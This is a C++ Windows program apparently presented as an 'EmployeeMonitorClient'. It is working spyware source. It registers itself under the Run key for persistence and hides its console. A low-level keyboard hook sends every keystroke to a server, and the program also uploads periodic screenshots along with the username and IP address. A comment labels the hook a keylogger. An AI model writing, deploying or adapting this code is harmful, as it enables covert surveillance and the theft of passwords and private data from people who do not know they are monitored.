#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <lmcons.h>
#include <thread>
#include <chrono>
#include <vector>
#include <objidl.h>
#include <gdiplus.h>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;
using namespace std;

ULONG_PTR gdiplusToken;

std::wstring GetExecutablePath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

void AddToStartup() {
    HKEY hKey;
    const wchar_t* czStartName = L"EmployeeMonitorClient";
    std::wstring exePath = GetExecutablePath() + L"\\..\\EmployeeMonitorClient\\x64\\Debug\\EmployeeMonitorClient.exe";
    const wchar_t* czExePath = exePath.c_str();

    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);
    if (ERROR_SUCCESS == lnRes) {
        lnRes = RegSetValueEx(hKey,
            czStartName,
            0,
            REG_SZ,
            (const BYTE*)czExePath,
            static_cast<DWORD>((wcslen(czExePath) + 1) * sizeof(wchar_t)));
    }
    RegCloseKey(hKey);
}

std::wstring GetCurrentUserName() {
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    return std::wstring(username);
}

std::wstring GetIPAddress() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return L"";
    }

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct addrinfo hints = { 0 };
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = NULL;
    getaddrinfo(hostname, NULL, &hints, &result);

    char ipStr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &((struct sockaddr_in*)result->ai_addr)->sin_addr, ipStr, sizeof(ipStr));

    WSACleanup();
    freeaddrinfo(result);

    std::wstring ipAddress(ipStr, ipStr + strlen(ipStr));
    return ipAddress;
}

std::wstring FetchCurrentTime() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t buffer[256];
    swprintf(buffer, 256, L"%04d-%02d-%02dT%02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);
    return std::wstring(buffer);
}

bool IsUserActive() {
    LASTINPUTINFO lii = { 0 };
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD tickCount = GetTickCount();
        DWORD idleTime = tickCount - lii.dwTime;
        return idleTime < 60000;
    }
    return false;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void CaptureScreenshot(vector<BYTE>& buffer) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    IStream* stream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &stream);

    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);
    bitmap.Save(stream, &clsid, NULL);

    STATSTG statstg;
    stream->Stat(&statstg, STATFLAG_DEFAULT);
    ULONG size = statstg.cbSize.LowPart;

    buffer.resize(size);
    LARGE_INTEGER li = {};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    stream->Read(buffer.data(), size, NULL);

    stream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
}

void SendDataToServer(const wstring& data, const vector<BYTE>& screenshotBuffer) {
    HINTERNET hSession = InternetOpen(L"EmployeeMonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnect(hSession, L"localhost", 3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", L"/api/monitor", NULL, NULL, NULL, 0, 0);
            if (hRequest) {
                const wchar_t* headers = L"Content-Type: application/json";
                string utf8Data(data.begin(), data.end());
                if (HttpSendRequest(hRequest, headers, static_cast<DWORD>(wcslen(headers)), (LPVOID)utf8Data.c_str(), static_cast<DWORD>(utf8Data.length()))) {
                    wcout << L"Data sent successfully\n";
                }
                else {
                    wcout << L"Failed to send data\n";
                }
                InternetCloseHandle(hRequest);
            }

            wstring username = GetCurrentUserName();
            wstring timestamp = FetchCurrentTime();
            wstring screenshotPath = L"/api/screenshot?user=" + username + L"&timestamp=" + timestamp;

            HINTERNET hScreenshotRequest = HttpOpenRequest(hConnect, L"POST", screenshotPath.c_str(), NULL, NULL, NULL, 0, 0);
            if (hScreenshotRequest) {
                const wchar_t* screenshotHeaders = L"Content-Type: application/octet-stream";
                if (HttpSendRequest(hScreenshotRequest, screenshotHeaders, static_cast<DWORD>(wcslen(screenshotHeaders)), (LPVOID)screenshotBuffer.data(), static_cast<DWORD>(screenshotBuffer.size()))) {
                    wcout << L"Screenshot sent successfully to: " << screenshotPath << L"\n";
                }
                else {
                    wcout << L"Failed to send screenshot\n";
                }
                InternetCloseHandle(hScreenshotRequest);
            }

            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

void MonitorAndSendData() {
    wstring user = GetCurrentUserName();
    wstring ip = GetIPAddress();

    while (true) {
        if (IsUserActive()) {
            wstring currentTime = FetchCurrentTime();
            wstring data = L"{\"user\":\"" + user + L"\",\"ip\":\"" + ip + L"\",\"lastActive\":\"" + currentTime + L"\"}";

            vector<BYTE> screenshotBuffer;
            CaptureScreenshot(screenshotBuffer);

            SendDataToServer(data, screenshotBuffer);
        }
        this_thread::sleep_for(chrono::minutes(1)); // Отправка данных каждую 1 минуту
    }
}

HHOOK hHook = NULL;
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;
        wchar_t key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);

        HINTERNET hSession = InternetOpen(L"EmployeeMonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hSession) {
            HINTERNET hConnect = InternetConnect(hSession, L"localhost", 3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", L"/api/keylog", NULL, NULL, NULL, 0, 0);
                if (hRequest) {
                    const wchar_t* headers = L"Content-Type: application/json";
                    wstring data = L"{\"user\":\"" + GetCurrentUserName() + L"\",\"key\":\"" + key + L"\"}";
                    string utf8Data(data.begin(), data.end());
                    HttpSendRequest(hRequest, headers, static_cast<DWORD>(wcslen(headers)), (LPVOID)utf8Data.c_str(), static_cast<DWORD>(utf8Data.length()));
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hSession);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

int main() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    AddToStartup();
    HideConsole(); // Скрытие консольного окна

    thread monitorThread(MonitorAndSendData);
    monitorThread.detach(); // Запускаем мониторинг в отдельном потоке и отсоединяем его

    SetHook(); // Установка хука для кейлоггера

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}
